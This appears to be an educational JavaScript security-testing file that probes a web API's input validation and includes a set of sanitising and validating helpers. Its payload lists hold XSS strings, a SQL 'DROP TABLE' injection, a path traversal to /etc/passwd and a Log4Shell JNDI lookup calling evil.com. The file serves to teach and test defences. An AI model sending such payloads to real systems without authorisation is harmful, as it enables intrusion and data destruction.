/**
 * EDUCATIONAL HACKING TUTORIALS
 * Module 1: Web Application Security
 * Lesson 6: Input Validation Testing
 * 
 * ⚠️ IMPORTANT: Educational Purpose Only
 * 
 * Learning Objectives:
 * - Understand input validation vulnerabilities
 * - Test for insufficient input validation
 * - Implement comprehensive validation
 * - Learn defensive input handling
 */

import { expect } from "chai";
import supertest from "supertest";

console.log("=== INPUT VALIDATION TESTING ===");
console.log("⚠️  FOR EDUCATIONAL AND SECURITY TESTING PURPOSES ONLY");

// Input Validation Tester
class InputValidationTester {
  constructor(apiClient) {
    this.apiClient = apiClient;
    this.testResults = [];
  }

  async testInputSanitization(endpoint, field, maliciousInputs) {
    console.log(`\n🔍 Testing Input Sanitization: ${endpoint} - ${field}`);
    
    const vulnerable = [];
    
    for (const input of maliciousInputs) {
      try {
        const payload = { [field]: input };
        const response = await this.apiClient
          .post(endpoint)
          .send(payload)
          .timeout(5000);
        
        const responseBody = JSON.stringify(response.body);
        
        // Check if malicious input is reflected without sanitization
        if (responseBody.includes(input) && !responseBody.includes("&lt;") && 
            !responseBody.includes("&gt;") && !responseBody.includes("&quot;")) {
          vulnerable.push({
            input: input.substring(0, 50),
            reflected: true
          });
        }
      } catch (error) {
        // Continue testing
      }
    }
    
    if (vulnerable.length > 0) {
      this.testResults.push({
        type: "Insufficient Input Sanitization",
        severity: "high",
        description: `${vulnerable.length} malicious input(s) not properly sanitized`,
        vulnerable: true,
        field,
        examples: vulnerable
      });
    }
    
    return vulnerable;
  }

  async testTypeValidation(endpoint, field, invalidTypes) {
    console.log(`\n🔍 Testing Type Validation: ${endpoint} - ${field}`);
    
    const vulnerable = [];
    
    for (const invalidType of invalidTypes) {
      try {
        const payload = { [field]: invalidType };
        const response = await this.apiClient
          .post(endpoint)
          .send(payload)
          .timeout(5000);
        
        // Check if invalid type is accepted
        if (response.status === 200 || response.status === 201) {
          vulnerable.push({
            type: typeof invalidType,
            value: JSON.stringify(invalidType).substring(0, 50),
            accepted: true
          });
        }
      } catch (error) {
        // Expected if validation is in place
      }
    }
    
    if (vulnerable.length > 0) {
      this.testResults.push({
        type: "Insufficient Type Validation",
        severity: "medium",
        description: `${vulnerable.length} invalid type(s) accepted`,
        vulnerable: true,
        field,
        examples: vulnerable
      });
    }
    
    return vulnerable;
  }

  async testLengthValidation(endpoint, field, maxLength) {
    console.log(`\n🔍 Testing Length Validation: ${endpoint} - ${field}`);
    
    // Test with extremely long input
    const longInput = "A".repeat(maxLength * 10);
    const veryLongInput = "A".repeat(maxLength * 100);
    
    const vulnerable = [];
    
    try {
      const response1 = await this.apiClient
        .post(endpoint)
        .send({ [field]: longInput })
        .timeout(5000);
      
      if (response1.status === 200 || response1.status === 201) {
        vulnerable.push({
          length: longInput.length,
          accepted: true
        });
      }
    } catch (error) {
      // Expected if validation is in place
    }
    
    try {
      const response2 = await this.apiClient
        .post(endpoint)
        .send({ [field]: veryLongInput })
        .timeout(5000);
      
      if (response2.status === 200 || response2.status === 201) {
        vulnerable.push({
          length: veryLongInput.length,
          accepted: true,
          severity: "critical"
        });
      }
    } catch (error) {
      // Expected if validation is in place
    }
    
    if (vulnerable.length > 0) {
      this.testResults.push({
        type: "Insufficient Length Validation",
        severity: "medium",
        description: `Inputs exceeding max length (${maxLength}) are accepted`,
        vulnerable: true,
        field,
        examples: vulnerable
      });
    }
    
    return vulnerable;
  }

  async testFormatValidation(endpoint, field, format, invalidFormats) {
    console.log(`\n🔍 Testing Format Validation: ${endpoint} - ${field}`);
    
    const vulnerable = [];
    
    for (const invalidFormat of invalidFormats) {
      try {
        const payload = { [field]: invalidFormat };
        const response = await this.apiClient
          .post(endpoint)
          .send(payload)
          .timeout(5000);
        
        if (response.status === 200 || response.status === 201) {
          vulnerable.push({
            format: invalidFormat,
            accepted: true
          });
        }
      } catch (error) {
        // Expected if validation is in place
      }
    }
    
    if (vulnerable.length > 0) {
      this.testResults.push({
        type: "Insufficient Format Validation",
        severity: "medium",
        description: `${vulnerable.length} invalid format(s) accepted for ${format}`,
        vulnerable: true,
        field,
        examples: vulnerable
      });
    }
    
    return vulnerable;
  }

  async testBoundaryConditions(endpoint, field, boundaries) {
    console.log(`\n🔍 Testing Boundary Conditions: ${endpoint} - ${field}`);
    
    const vulnerable = [];
    const testValues = [
      boundaries.min - 1,
      boundaries.min,
      boundaries.min + 1,
      boundaries.max - 1,
      boundaries.max,
      boundaries.max + 1,
      0,
      -1,
      Number.MAX_SAFE_INTEGER,
      Number.MIN_SAFE_INTEGER
    ];
    
    for (const value of testValues) {
      try {
        const payload = { [field]: value };
        const response = await this.apiClient
          .post(endpoint)
          .send(payload)
          .timeout(5000);
        
        // Check if out-of-boundary values are accepted
        if ((value < boundaries.min || value > boundaries.max) && 
            (response.status === 200 || response.status === 201)) {
          vulnerable.push({
            value,
            boundary: value < boundaries.min ? "below minimum" : "above maximum",
            accepted: true
          });
        }
      } catch (error) {
        // Expected if validation is in place
      }
    }
    
    if (vulnerable.length > 0) {
      this.testResults.push({
        type: "Insufficient Boundary Validation",
        severity: "medium",
        description: `Out-of-boundary values accepted (min: ${boundaries.min}, max: ${boundaries.max})`,
        vulnerable: true,
        field,
        examples: vulnerable
      });
    }
    
    return vulnerable;
  }

  async testSpecialCharacterHandling(endpoint, field) {
    console.log(`\n🔍 Testing Special Character Handling: ${endpoint} - ${field}`);
    
    const specialCharacters = [
      "<script>alert('XSS')</script>",
      "'; DROP TABLE users; --",
      "../../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
      "{{7*7}}",
      "\x00",
      "\n",
      "\r",
      "\t",
      "\\",
      "'",
      "\"",
      "`",
      "&",
      "<",
      ">",
      "/",
      "?",
      "#",
      "[",
      "]",
      "{",
      "}",
      "|",
      "^",
      "~"
    ];
    
    const vulnerable = [];
    
    for (const char of specialCharacters) {
      try {
        const payload = { [field]: char };
        const response = await this.apiClient
          .post(endpoint)
          .send(payload)
          .timeout(5000);
        
        const responseBody = JSON.stringify(response.body);
        
        // Check if special characters cause issues or are not properly handled
        if (response.status === 500 || 
            (response.status === 200 && responseBody.includes(char) && 
             !responseBody.includes("&lt;") && !responseBody.includes("&quot;"))) {
          vulnerable.push({
            character: char,
            issue: response.status === 500 ? "causes error" : "not properly escaped"
          });
        }
      } catch (error) {
        // Continue testing
      }
    }
    
    if (vulnerable.length > 0) {
      this.testResults.push({
        type: "Insufficient Special Character Handling",
        severity: "high",
        description: `${vulnerable.length} special character(s) not properly handled`,
        vulnerable: true,
        field,
        examples: vulnerable
      });
    }
    
    return vulnerable;
  }

  generateValidationReport() {
    console.log("\n📊 Input Validation Test Report:");
    console.log("=" .repeat(50));
    
    const vulnerable = this.testResults.filter(r => r.vulnerable === true);
    const total = this.testResults.length;
    
    console.log(`Total Tests: ${total}`);
    console.log(`Vulnerabilities Found: ${vulnerable.length}`);
    
    if (vulnerable.length > 0) {
      console.log("\nVulnerabilities:");
      vulnerable.forEach(vuln => {
        console.log(`  - ${vuln.type}: ${vuln.severity} severity`);
        console.log(`    Field: ${vuln.field}`);
        console.log(`    ${vuln.description}`);
      });
    }
    
    console.log("=" .repeat(50));
    
    return {
      total,
      vulnerable: vulnerable.length,
      results: this.testResults
    };
  }
}

// Secure Input Validation Implementation
class SecureInputValidation {
  static sanitizeHTML(input) {
    return input
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;")
      .replace(/\//g, "&#x2F;");
  }

  static validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  static validateLength(input, min, max) {
    if (typeof input !== "string") return false;
    return input.length >= min && input.length <= max;
  }

  static validateType(value, expectedType) {
    if (expectedType === "number") {
      return typeof value === "number" && !isNaN(value);
    }
    if (expectedType === "string") {
      return typeof value === "string";
    }
    if (expectedType === "boolean") {
      return typeof value === "boolean";
    }
    return typeof value === expectedType;
  }

  static validateFormat(input, pattern) {
    const regex = new RegExp(pattern);
    return regex.test(input);
  }

  static validateBoundary(value, min, max) {
    if (typeof value !== "number") return false;
    return value >= min && value <= max;
  }

  static escapeSpecialCharacters(input) {
    return input
      .replace(/\\/g, "\\\\")
      .replace(/'/g, "\\'")
      .replace(/"/g, '\\"')
      .replace(/\n/g, "\\n")
      .replace(/\r/g, "\\r")
      .replace(/\t/g, "\\t")
      .replace(/\x00/g, "");
  }
}

// Test Scenarios
async function testInputSanitization() {
  console.log("\n📝 Test 1: Input Sanitization");
  
  const tester = new InputValidationTester(supertest("https://example.com"));
  const maliciousInputs = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>"
  ];
  
  const results = await tester.testInputSanitization(
    "/api/users",
    "name",
    maliciousInputs
  );
  
  expect(results).to.be.an("array");
  console.log(`✅ Tested ${maliciousInputs.length} malicious inputs`);
}

async function testTypeValidation() {
  console.log("\n📝 Test 2: Type Validation");
  
  const tester = new InputValidationTester(supertest("https://example.com"));
  const invalidTypes = [
    null,
    undefined,
    [],
    {},
    true,
    123,
    "string when number expected"
  ];
  
  const results = await tester.testTypeValidation(
    "/api/users",
    "age",
    invalidTypes
  );
  
  expect(results).to.be.an("array");
  console.log(`✅ Tested ${invalidTypes.length} invalid types`);
}

async function testLengthValidation() {
  console.log("\n📝 Test 3: Length Validation");
  
  const tester = new InputValidationTester(supertest("https://example.com"));
  const results = await tester.testLengthValidation(
    "/api/users",
    "name",
    100
  );
  
  expect(results).to.be.an("array");
  console.log("✅ Length validation test completed");
}

async function testFormatValidation() {
  console.log("\n📝 Test 4: Format Validation");
  
  const tester = new InputValidationTester(supertest("https://example.com"));
  const invalidEmails = [
    "not-an-email",
    "@example.com",
    "user@",
    "user@example",
    "user..name@example.com"
  ];
  
  const results = await tester.testFormatValidation(
    "/api/users",
    "email",
    "email",
    invalidEmails
  );
  
  expect(results).to.be.an("array");
  console.log(`✅ Tested ${invalidEmails.length} invalid email formats`);
}

async function testSecureValidation() {
  console.log("\n📝 Test 5: Secure Validation Implementation");
  
  // Test HTML sanitization
  const malicious = "<script>alert('XSS')</script>";
  const sanitized = SecureInputValidation.sanitizeHTML(malicious);
  expect(sanitized).to.not.include("<script>");
  
  // Test email validation
  expect(SecureInputValidation.validateEmail("test@example.com")).to.be.true;
  expect(SecureInputValidation.validateEmail("invalid-email")).to.be.false;
  
  // Test length validation
  expect(SecureInputValidation.validateLength("test", 1, 10)).to.be.true;
  expect(SecureInputValidation.validateLength("toolongstring", 1, 5)).to.be.false;
  
  // Test type validation
  expect(SecureInputValidation.validateType(123, "number")).to.be.true;
  expect(SecureInputValidation.validateType("123", "number")).to.be.false;
  
  console.log("✅ Secure validation implementation test passed");
}

// Run all tests
(async () => {
  try {
    console.log("\n⚠️  REMINDER: This tutorial is for educational purposes only.");
    console.log("   Only test systems you own or have explicit permission to test.\n");
    
    await testInputSanitization();
    await testTypeValidation();
    await testLengthValidation();
    await testFormatValidation();
    await testSecureValidation();
    
    console.log("\n✅ All input validation tests completed!");
    console.log("\n📚 Key Takeaways:");
    console.log("   - Always validate input type, length, and format");
    console.log("   - Sanitize all user inputs before processing");
    console.log("   - Implement whitelist validation when possible");
    console.log("   - Test boundary conditions");
    console.log("   - Handle special characters properly");
    console.log("   - Use parameterized queries for database operations");
  } catch (error) {
    console.error("❌ Test failed:", error.message);
    process.exit(1);
  }
})();

